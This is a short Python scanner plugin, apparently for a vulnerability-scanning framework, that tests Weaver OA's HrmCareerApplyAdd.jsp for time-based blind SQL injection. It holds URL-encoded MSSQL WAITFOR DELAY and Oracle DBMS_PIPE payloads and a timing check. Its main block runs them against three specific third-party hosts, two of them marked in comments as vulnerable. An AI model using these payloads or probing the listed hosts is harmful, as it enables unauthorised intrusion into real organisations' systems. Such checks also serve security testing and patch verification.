#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0134994

import time

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):            
    payloads = [
        'web/careerapply/HrmCareerApplyAdd.jsp?careerid=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
        'web/careerapply/HrmCareerApplyAdd.jsp?careerid=1%20AND%20100%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28121%29%7C%7CCHR%2884%29%7C%7CCHR%2866%29%2C5%29'
        ]
    for payload1 in payloads:
        payload2 = payload1.replace('5','0')
        t1 = time.time()
        code1, head, res, errcode, _ = curl.curl2(arg+payload1)
        t2 = time.time()
        code2, head, res, errcode, _ = curl.curl2(arg+payload2)
        t3 = time.time()
        if code1 == 200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
            security_hole(arg + payload1 + "   :sql Injection")
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa','http://oa.scjnh.com:9000/')[1])#没有注入
    audit(assign('weaver_oa','http://oaf.yitoa.com:6688/')[1])#存在注入
    audit(assign('weaver_oa','http://222.76.205.252:99/')[1])#存在注入